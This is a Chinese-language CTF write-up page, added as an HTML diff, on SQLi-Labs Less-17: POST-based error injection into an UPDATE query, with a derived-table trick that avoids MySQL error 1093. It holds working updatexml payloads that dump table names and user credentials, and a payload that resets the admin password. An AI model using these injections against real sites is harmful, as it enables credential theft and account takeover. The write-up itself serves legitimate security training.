@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-17 POST型 UPDATE 报错注入与派生表绕过 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-17 POST型 UPDATE 报错注入与派生表绕过 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.24 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, POST注入, UPDATE注入, 报错注入</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-17 (POST - Update Query - Error Based - String)</li>
+        <li><strong>提示：</strong>POST请求，更新（UPDATE）查询注入，报错注入</li>
+    </ul>
+
+    <h2>2. 解题思路与前置原理</h2>
+    
+    <h3>2.1 注入点的确定</h3>
+    <p>本关卡为密码重置界面。根据后端代码逻辑，系统分为两步执行：</p>
+    <ol>
+        <li>首先使用 <code>SELECT</code> 语句查询传入的 <code>uname</code> 是否存在。</li>
+        <li>如果存在，则执行 <code>UPDATE users SET password='$passwd' WHERE username='$uname'</code>。</li>
+    </ol>
+    <p>如果在 <code>uname</code> 处进行注入并触发报错，会导致第一步 <code>SELECT</code> 失败，程序将无法执行到 <code>UPDATE</code> 语句。因此，注入点必须选在 <code>passwd</code> 字段。</p>
+
+    <h3>2.2 UPDATE 注入与 Error 1093 限制</h3>
+    <p>在 <code>passwd</code> 字段使用 <code>updatexml</code> 构造报错注入时，若直接子查询 <code>users</code> 表，例如：<br>
+    <code>AND updatexml(1, concat(0x7e, (select group_concat(username) from users), 0x7e), 1)</code></p>
+    <p>MySQL 会抛出 <code>Error 1093: You can't specify target table 'users' for update in FROM clause</code>。<br>
+    <strong>原理：</strong>在 MySQL 中，禁止在 <code>UPDATE</code> 或 <code>DELETE</code> 某个表的同时，在子查询中直接读取该目标表。这是为了防止引擎在执行时发生自锁（Self-Deadlock）或导致数据隔离级别冲突。</p>
+
+    <h3>2.3 派生表（Derived Table）绕过机制</h3>
+    <p>为了绕过限制，需要引入派生表。语法为 <code>FROM (SELECT ...) AS alias</code>。</p>
+    <p><strong>底层执行机制：</strong>MySQL 引擎在执行时，会先执行括号内的子查询，将其结果集物化（Materialization）到一张内存或磁盘的临时表中（命名为别名 <code>t</code>）。此时，外层查询针对的是临时表 <code>t</code>，而非物理表 <code>users</code>，从而规避了 1093 错误。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>工具环境：</strong>Burp Suite（浏览器代理已配置，使用 Repeater 模块进行请求篡改）。</p>
+
+    <p><strong>第一步：抓包与探测注入点</strong></p>
+    <p>抓取 POST 请求体，将 <code>passwd</code> 字段的值修改为 <code>123'</code>：</p>
+    <pre><code>uname=admin&passwd=123'&submit=Submit</code></pre>
+    <p><strong>回显现象：</strong>页面报错 <code>You have an error in your SQL syntax... near 'admin' at line 1</code>。</p>
+    <p><strong>解释：</strong>输入的 <code>123'</code> 闭合了前端的 <code>'$passwd'</code>，导致后续的 <code>WHERE username = </code> 被解析为字符串内容，最后裸奔的 <code>admin</code> 触发语法错误，证明此处存在单引号字符型注入。</p>
+
+    <p><strong>第二步：利用 updatexml 爆出表名</strong></p>
+    <p>在 <code>passwd</code> 处闭合后使用 <code>#</code> 截断后续代码，使用报错函数：</p>
+    <pre><code>uname=admin&passwd=1' AND updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 0x7e), 1) #&submit=Submit</code></pre>
+    <p><strong>回显现象：</strong>报错信息泄露 <code>~emails,referrers,uagents,users~</code>。</p>
+
+    <p><strong>第三步：利用派生表绕过限制提取数据</strong></p>
+    <p>直接查询 <code>users</code> 报 1093 错误，将 Payload 修改为使用派生表：</p>
+    <pre><code>uname=admin&passwd=1' AND updatexml(1, concat(0x7e, (select group_concat(username, 0x3a, password) from (select username, password from security.users) as t), 0x7e), 1) #&submit=Submit</code></pre>
+    <p><strong>回显现象：</strong>成功报错 <code>XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'</code>。数据因报错字符长度限制被截断，但核心账号密码已成功提取。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>注入点的逻辑判断：</strong>在带有前置校验（如查用户是否存在）的 POST 业务中，必须将注入点放在后续参与核心查询/更新的参数上（如本例的 <code>passwd</code>）。若在 <code>uname</code> 处注入，只会导致前置校验失败而无法触发真正的漏洞代码。</li>
+        <li><strong>派生表语法强制要求：</strong><code>FROM (SELECT ...)</code> 后面必须跟上 <code>AS 别名</code>，否则 MySQL 无法区分数据源，会直接报错。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>UPDATE 注入：</strong>针对更新语句的注入，在实战中极其危险，最直接的利用方式是篡改管理员密码（<code>1' WHERE username='admin' #</code>）。</li>
+        <li><strong>派生表（Derived Table）：</strong>在 <code>FROM</code> 子句中使用的子查询，生成临时结果集。是 SQL 注入中解决“同表更新与查询”冲突的关键手段。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
